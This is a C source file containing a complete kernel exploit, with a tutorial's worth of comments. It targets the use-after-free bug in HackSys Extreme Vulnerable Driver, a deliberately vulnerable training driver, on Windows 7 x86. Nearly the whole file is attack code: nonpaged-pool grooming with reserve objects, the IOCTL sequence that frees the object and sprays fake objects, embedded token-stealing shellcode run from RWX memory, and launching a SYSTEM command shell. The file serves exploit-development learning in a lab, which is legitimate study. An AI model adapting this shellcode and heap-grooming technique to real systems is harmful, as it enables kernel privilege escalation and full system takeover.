#include "stdafx.h"
#include "windows.h"

//Thanks to https://github.com/adobe/chromium/blob/master/sandbox/tools/finder/ntundoc.h for this

// We need to define UNICODE_STRING so that OBJECT_ATTRIBUTES can have all its elements defined.
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING;

// Need to define OBJECT_ATTRIBUTES so POBJECT_ATTRIBUTES knows what its a pointer to.
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	UNICODE_STRING *ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

// Finally, we need to define POBJECT_ATTRIBUTES as a pointer to an OBJECT_ATTRIBUTES object
// so that NtAllocateReserveObject knows what its second argument is a pointer to.
#define POBJECT_ATTRIBUTES OBJECT_ATTRIBUTES*

// Thanks to https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp for this definition
// Need to declare what parameters NtAllocateReserveObject takes in here, their type, the calling convention (WINAPI aka _stdcall in this case), 
// and the return value type (NTSTATUS).
//
// Note that the IN/OUT is optional I believe (don't quote me on this), and simply denotes which input is pure input and which we should expect
// to be altered by the call upon it returning.
typedef NTSTATUS(WINAPI *_NtAllocateReserveObject)(
	OUT PHANDLE hObject,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN DWORD ObjectType);


// BIG NOTE! To follow along symbols were messed up on my pc. To fix them need to do the following:
// CTL+BREAK in WinDBG.
// .symfix
// .reload /f
// See https://jlospinoso.github.io/developing/kernel%20mode/operating%20systems/software/software%20engineering/windows%20internals/2015/01/12/tools-for-fixing-symbols-issues-in-windbg.html
// for more, but I also had to add the certificate Microsoft issued to the computer's repository as WinDBG was being a pain complaining about "are you sure" even though the cert looked fine.

int main()
{
	printf("Setting up the heap prior to the exploit commencing.\r\n");
	HANDLE theHandle = 0; /* In FuzzySecurity's tutorial this was an int pointer to 0 which is essentially just a NULL handle. So I just made a
						  HANDLE which contained the value 0. We later set a pointer to this (of type PHANDLE, aka pointer to handle) in our NtAllocateReserveObject call*/
	PHANDLE callResult = NULL; // NtAllocateReserveObject returns a PHANDLE value. Lets allocate a variable to hold the returned value.

	// Use the usual strategy to find the address through the combination of getting the module handle with GetModuleHandle 
	// and then finding the address of the function via GetProcAddress. Cast result to _NtAllocateReserveObject and save it in
	// a variable of a similar type so compiler knows this is a function pointer, what parameters the function requires, and what it will return.
	_NtAllocateReserveObject NtAllocateReserveObject = (_NtAllocateReserveObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateReserveObject");

	// Need to allocate arrays to save the handles otherwise without saving handles the allocations will be free'd and our work will be meaningless.
	HANDLE handleArray1[10000] = { 0 }; /* Set up first array of handles to hold the handles for our initital spray to fill free space 
										at the start of the heap. Doing so will ensure most of the spaces where 0x60 allocations could 
										fall into are filled up. */
	HANDLE handleArray2[5000] = { 0 }; /* Set up second array of handles to hold handles for second spray. This spray will allocate several
									   0x60 sized objects and then free half of them, leaving free gaps of size 0x60 inbetween allocated chunks.

									   Aka:

									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)

									   This prevents coalescing and will help ensure that the allocation of the g_UseAfterFree object will occur 
									   in one of these spaces. The pointer will remain stale to a 0x60 chunk in this allocation area (of 5000 0x60 sized pool objects).

									   So like this:

									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60) <-----------------------------g_UseAfterFree gets allocated here, very few other 0x60 sized blocks at this point, and perfect size so allocator prefers this
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)



									   So all we need to do after we free the memory used by g_UseAfterFree is to allocate multiple fake 0x60 chunks of the same structure
									   as the g_UseAfterFree object that we used, which should eventually fill in the 0x60 chunk used by g_UseAfterFree.
									   
									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60) <-----------------------------Stale g_UseAfterFree pointer here. If we allocated multiple fake 0x60 sized chunks, chances are one of them uses this address.
																					   The program will treat the fake object as though it is a g_UseAfterFree object and try call its callback function
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)
									   Free (Size: 0x60)
									   Allocated (Size: 0x60, Tag: IOCO)
									   
									   */

	/* Page 19 of Reserve Objects in Windows 7 by @j00ru available at http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf explains this more as
	well as how the NtAllocateReserveObject only has two objects at the time of writing, UserApcReserve, and IoCompletionReserve.
	IoCompletionReserve is 1, and UserApcReserve is 0, hence why we define it as 1 here.

	Still not sure about the sizes of the objects though. They appear to match with @j00ru's observations of x86-64 Windows 7 object sizes, yet
	the platform I am targeting is Windows 7 x86 bit?

	Looking into this further the article was published in July 2010, the same month that SP1 came out. He also notes these functions were in early development
	so they probably upgraded the size with SP1 to be uniformally 0x58 + 8 byte header. Similarly the UserApcReserve object has also been changed to a size offfffffff
	0x60 + 8 byte header on Windows 7 SP1 x86. Can only imagine this is the same on x64 but would need to check.
	
	Here is some evidence to show what I mean just for reference.  "User" tag is for UserApcReserve objects, "IoCo" for IoCompletionReserve objects.

	kd> !pool 86dd4c88
	Pool page 86dd4c88 region is Nonpaged pool
	86dd4000 size:   68 previous size:    0  (Allocated)  User (Protected)
	86dd4068 size:   28 previous size:   68  (Free)       ..c.
	86dd4090 size:   68 previous size:   28  (Allocated)  User (Protected)
	86dd40f8 size:   68 previous size:   68  (Allocated)  User (Protected)
	86dd4160 size:   68 previous size:   68  (Allocated)  User (Protected)
	86dd41c8 size:   68 previous size:   68  (Allocated)  User (Protected)
	86dd4230 size:   68 previous size:   68  (Allocated)  User (Protected)
	86dd4298 size:   68 previous size:   68  (Allocated)  User (Protected)
	86dd4300 size:   68 previous size:   68  (Allocated)  User (Protected)
	86dd4368 size:   68 previous size:   68  (Allocated)  User (Protected)
	kd> !pool 8671fd90
	Pool page 8671fd90 region is Nonpaged pool
	8671fd00 size:   60 previous size:   60  (Allocated)  Hack
	*8671fd60 size:   60 previous size:   60  (Allocated) *IoCo (Protected)
	*/
	#define IoCompletionReserve 1
	printf("Filling in chunks at beginning of nonpaged pool\r\n");
	for (int i = 0; i < 10000; i++) {
		callResult = (PHANDLE)NtAllocateReserveObject((PHANDLE)&theHandle, NULL, IoCompletionReserve);
		if (callResult == 0) {
			handleArray1[i] = theHandle; // Save inital allocation handles in first array so they won't be free'd and the memory unreserved.
		}
	}
	printf("Hopefully we have some sequental allocations for these next 5000 allocations.\r\n");
	for (int i = 0; i < 5000; i++) {
		callResult = (PHANDLE)NtAllocateReserveObject((PHANDLE)&theHandle, NULL, IoCompletionReserve);
		if (callResult == 0) {
			handleArray2[i] = theHandle; // Save sequental allocation handles in first array so they won't be free'd and the memory unreserved. Also for making holes in memory later :)
		}
	}
	//DebugBreak(); // Can break here if you want using DebugBreak() which will send a debugging message to WinDBG or any similar debugger to pause execution.

	printf("\r\nFreeing every 2nd chunk in 2nd block of allocations to make free spaces of size\r\n0x60 and prevent joining together of blocks by the heap manager.\r\n\r\n");
	int freedCount = 0; // Keep track of number of blocks successfully freed.
	int result = 0; // Just an INT to keep track of the return value, make sure the call completed successfully (aka returned 0).
	for (int i = 0; i < 5000; i += 2) { // Use i += 2 so that we close the handle to every second allocation within our contiguous allocation range, thus freeing memory (no active HANDLE = mem freed)
		result = CloseHandle(handleArray2[i]);
		if (result != 0) {
			freedCount++;
		}
	}
	printf("Freed %i of the 5000 sequental blocks\r\n", freedCount);
	//DebugBreak();
	
	printf("Opening handle to driver\r\n");
	HANDLE driverHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);
	if (driverHandle == INVALID_HANDLE_VALUE) {
		printf("Unable to get handle to HEVD driver. Exiting. \r\n");
		return 1;
	}
	printf("Got valid handle: %i\r\n", driverHandle);

	DWORD bytesReturned = 0; // Small int to hold number of bytes returned cause we have to :P

	// Initialize the g_UseAfterFree object so that it will actually point to a memory location on the heap. Atm this location is filled with a valid object.
	printf("Calling HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT to intialize g_UseAfterFree object.\r\n");
	DeviceIoControl(driverHandle, 0x222013, NULL, 0, NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);

	// Interesting note here. If you call free() on an object that is already free within the kernel, you will get a BAD_POOL_CALLER error message
	// and the system will BSOD. So I'm guessing normal behavior for a double free bug is the system crashes, trick would be to get item reserved.
	// Before the second free occurs. IDK though, thats another class of bug I haven't explored but interesting to see the connection here.
	//
	// This will ensure memory at the location pointed to by g_UseAfterFree is technically arbitrary memory. Could be free or used by another process, etc.
	printf("Calling HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT to free the\r\nspace allocated by g_UseAfterFree.\r\n");
	DeviceIoControl(driverHandle, 0x22201B, NULL, 0, NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);
	
	// At this point we need to create the fake objects and spray them in memory to try fill in the hole where g_UseAfterFree points to 
	// in memory and replace this memory with a fake object. Part of this fake object needs to have the address of the callback function filled in
	// which will point to our shellcode address. Hence allocate shellcode and get the address its allocated at so we can fill this information correctly.
	printf("Allocating shellcode...\r\n");
	char shellcode[66] = (
		"\x60" // PUSHAD
		"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
		"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
								   // #---[Copy System PID token]
		"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
		"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
		"\x75\xED" // jnz                                          -> |
		"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
								   //#---[Recover]
		"\x61" // popad
		"\x31\xC0" // Set NTSTATUS->STATUS_SUCCESS so calling function thinks we exited successfully
		"\xC3" // RET 
		);
	printf("Shellcode size: %i\r\n", sizeof(shellcode));

	printf("Reserving RWX memory for shellcode with VirtualAlloc\r\n");
	LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("Copying shellcode into this memory\r\n");
	memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
	LPVOID sourceAddress = &shellcodeAddress; // Make pointer to shellcode address so memcpy works correctly later on.
	

	printf("Calling HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT to create 5000 replacement objects.\r\n");
	// Set up the object that we will be using to spray the heap
	byte inBuffer[0x58] = { 0 };
	memcpy(inBuffer, sourceAddress, 4); // Fill first 4 bytes of the object, aka the callback address, with the address of our allocated shellcode so when callback is performed, get SYSTEM code execution.
	memset(inBuffer + 4, '\x42', 0x54); // Fill rest of object in to make 0x58 size object. We will add 0x8 sized header to this to get 0x60.
	memset(inBuffer + 0x57, '\x00', 1);
	
	// Spray 5000 instances of this object into the heap memory in the hopes of filling in all the holes and subsequentally filling in the hole that
	// g_UseAfterFree points to.
	for (int i = 0; i < 5000; i++) {
		DeviceIoControl(driverHandle, 0x22201F, inBuffer, sizeof(inBuffer), NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);
	}

	// Hmm so if we call this after the allocation and free calls, without allocating another object, it will go ahead and read the
	// first 4 bytes from the address of the stale g_UseAfterFreeObject, which now points to pool memory which could have been allocated
	// to another pool object, or which could be free, and will use this as a pointer to an address to call to with kernel mode permissions.
	//
	// In the case that the exploit succeeds however, this memory should point to the shellcode, aka the callback address will point to our shellcode
	// which will now get executed as though it was the callback function with kernel level permissions.
	printf("Calling HACKSYS_EVD_IOCTL_USE_UAF_OBJECT to use the stale g_UseAfterFree object variable which should now point to our controlled object.\r\n");
	DeviceIoControl(driverHandle, 0x222017, NULL, 0, NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);

	printf("Ok we should have SYSTEM privs now. Lets spawn a SYSTEM cmd.exe shell.\r\n");
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	return 0;
}

